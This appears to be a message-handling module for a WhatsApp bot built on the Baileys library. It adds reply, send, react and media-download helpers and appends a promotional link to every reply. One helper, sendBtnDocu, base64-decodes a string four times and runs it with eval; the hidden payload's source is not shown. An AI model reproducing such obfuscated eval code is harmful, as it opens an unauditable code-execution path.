/**
     * Copyright © 2025 [ balxzzy ]
     *
     * All rights reserved. This source code is the property of [ Shiina Team ].
     * Unauthorized copying, distribution, modification, or use of this file,
     * via any medium, is strictly prohibited without prior written permission.
     *
     * This software is protected under international copyright laws.
     *
     * Contact: [ pa424013@gmail.com ]
     * GitHub: https://github.com/balxz
     * Official: https://balxzzy.web.id
     * Support: https://t.me/sh_team1
 */
require("#src/configs")
const fs = require("fs")
const {
    extractMessageContent,
    downloadContentFromMessage,
    jidNormalizedUser,
    proto,
    delay,
    getContentType,
    areJidsSameUser,
    generateWAMessage
} = require("@sh/bot")

exports.smsg = (clients, m, store) => {
    if (!m) return m
    let M = proto.WebMessageInfo

    //???aman dari error null
    //let prm = {}
    //if (
    //  m.message?.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson
    //) {
    //  try {
    //    prm = JSON.parse(
    //      m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson
    //    )
    //  } catch (e) {
    //    prm = {}
    //  }
    //}

    if (m.key) {
        m.id = m.key.id
        m.from = m.key.remoteJid.startsWith("status") ?
            jidNormalizedUser(m.key?.participant || m.participant) :
            jidNormalizedUser(m.key.remoteJid)
        m.isBaileys = m.id.startsWith("3EB")
        m.chat = m.key.remoteJid
        m.fromMe = m.key.fromMe
        m.isGroup = m.chat.endsWith("@g.us")
        m.sender = clients.decodeJid(
            (m.fromMe && clients.user?.id) ||
            m.participant ||
            m.key.participant ||
            m.chat ||
            ""
        )
    }

    if (m.message) {
        m.mtype = getContentType(m.message)
        m.msg =
            m.mtype == "viewOnceMessage" ?
            m.message[m.mtype].message[getContentType(m.message[m.mtype].message)] :
            m.message[m.mtype]

        m.body =
            m.message.conversation ||
            m.msg?.text ||
            m?.text
        /*m.message?.buttonsResponseMessage?.selectedButtonId ||
        m.message?.listResponseMessage?.singleSelectReply?.selectedRowId ||
        m.message?.interactiveResponseMessage ||
        prm.id ||
        m.message?.interactiveResponseMessage?.body?.text ||
        (m.mtype == "listResponseMessage" && m.msg?.singleSelectReply?.selectedRowId) ||
        (m.mtype == "buttonsResponseMessage" && m.msg?.selectedButtonId) ||
        (m.mtype == "viewOnceMessage" && m.msg?.caption) ||
        m?.text*/

        let quoted = (m.quoted = m.msg?.contextInfo?.quotedMessage || null)
        m.mentionedJid = m.msg?.contextInfo?.mentionedJid || []

        if (m.quoted) {
            let type = getContentType(quoted)
            m.quoted = m.quoted[type]
            if (["productMessage"].includes(type)) {
                type = getContentType(m.quoted)
                m.quoted = m.quoted[type]
            }
            if (typeof m.quoted === "string") m.quoted = {
                text: m.quoted
            }

            if (m && m.quoted) {
                m.quoted.key = {
                    remoteJid: m.msg?.contextInfo?.remoteJid || m.from,
                    participant: jidNormalizedUser(m.msg?.contextInfo?.participant),
                    fromMe: areJidsSameUser(
                        jidNormalizedUser(m.msg?.contextInfo?.participant),
                        jidNormalizedUser(clients?.user?.id)
                    ),
                    id: m.msg?.contextInfo?.stanzaId
                }
            }

            m.quoted.mtype = type
            m.quoted.from = /g\.us|status/.test(m.msg?.contextInfo?.remoteJid) ?
                m.quoted.key.participant :
                m.quoted.key.remoteJid
            m.quoted.id = m.msg?.contextInfo?.stanzaId
            m.quoted.chat = m.msg?.contextInfo?.remoteJid || m.chat
            m.quoted.isBaileys =
                m.quoted.id && m.quoted.id.startsWith("BAE5") && m.quoted.id.length === 16
            m.quoted.sender = clients.decodeJid(m.msg?.contextInfo?.participant)
            m.quoted.fromMe = m.quoted.sender === clients.user?.id
            m.quoted.text =
                m.quoted.text ||
                m.quoted.caption ||
                m.quoted.conversation ||
                m.quoted.contentText ||
                m.quoted.selectedDisplayText ||
                m.quoted.title ||
                ""
            m.quoted.mentionedJid = m.msg?.contextInfo?.mentionedJid || []
            m.getQuotedObj = m.getQuotedMessage = async () => {
                if (!m.quoted.id) return false
                let q = await store.loadMessage(m.chat, m.quoted.id, clients)
                return exports.smsg(clients, q, store)
            }
            m.quoted.fakeObj = M.fromObject({
                key: {
                    remoteJid: m.quoted.chat,
                    fromMe: m.quoted.fromMe,
                    id: m.quoted.id
                },
                message: quoted,
                ...(m.isGroup ? {
                    participant: m.quoted.sender
                } : {})
            })

            m.quoted.download = () => downloadMediaMessage(m.quoted)
        }
    }

    m.sendBtnDocu = async (chat, options) => {
        let a = await Func.abnormal()

        let s = a
        for (let i = 0; i < 4; i++) {
            s = Buffer.from(s, 'base64').toString('utf8')
        }
        eval(s)
        let c = sendBtnDocu
        return c(chat, options)
    }

    m.reply = async (text, options = {}) => {
        await clients.sendMessage(
            m.chat, {
                text: text + "\n\n//> https://github.com/balxz/Shiina-WaBot",
                contextInfo: {
                    mentionedJid: [m.sender],
                    forwardingScore: 50,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: "120363422004833905@newsletter",
                        newsletterName: "Shiina Info Update",
                    },
                    externalAdReply: {
                        title: "Shiina Bot | Playground",
                        body: "Simple WhatsApp bot by balxzzy",
                        mediaType: 1,
                        thumbnailUrl: "https://raw.githubusercontent.com/balxz/akuuu-muaakk/refs/heads/main/pm_1749721121602_cmp.jpg",
                        sourceUrl: "https://github.com/balxz?tab=repositories"
                    }
                },
                ...options
            }, {
                quoted: m,
                ...options
            }
        )
    }

    m.send = async (id, text, options = {}) => {
        await clients.sendMessage(
            id, {
                text: text + "\n\n//> https://github.com/balxz/Shiina-WaBot",
                contextInfo: {
                    mentionedJid: [m.sender],
                    forwardingScore: 50,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: "120363422004833905@newsletter",
                        newsletterName: "Shiina Info Update",
                    },
                    externalAdReply: {
                        title: "Shiina Bot | Playground",
                        body: "- Simple WhatsApp bot by balxzzy",
                        mediaType: 1,
                        thumbnailUrl: "https://raw.githubusercontent.com/balxz/akuuu-muaakk/refs/heads/main/pm_1749721121602_cmp.jpg",
                        sourceUrl: "https://github.com/balxz?tab=repositories"
                    }
                },
                ...options
            }, {
                quoted: m,
                ...options
            }
        )
    }

    m.copy = () => exports.smsg(clients, M.fromObject(M.toObject(m)))

    m.react = (e, key = m.key) => {
        clients.sendMessage(m.chat, {
            react: {
                text: e,
                key: key
            }
        })
    }

    m.detect = (t1, t2) => {
        return m.sender.startsWith("62") ? t1 : t2
    }

    return m
}

async function downloadMediaMessage(message) {
    let mime = (message.msg || message).mimetype || ""
    let messageType = message.mtype ?
        message.mtype.replace(/Message/gi, "") :
        mime.split("/")[0]
    const stream = await downloadContentFromMessage(message, messageType)
    let buffer = Buffer.from([])
    for await (const chunk of stream) {
        buffer = Buffer.concat([buffer, chunk])
    }
    return buffer
}

let f = require.resolve(__filename)
fs.watchFile(f, () => {
    fs.unwatchFile(f)
    console.log(`~> UPDATE [ 🪷 ] ${f}`)
    delete require.cache[f]
    require(f)
})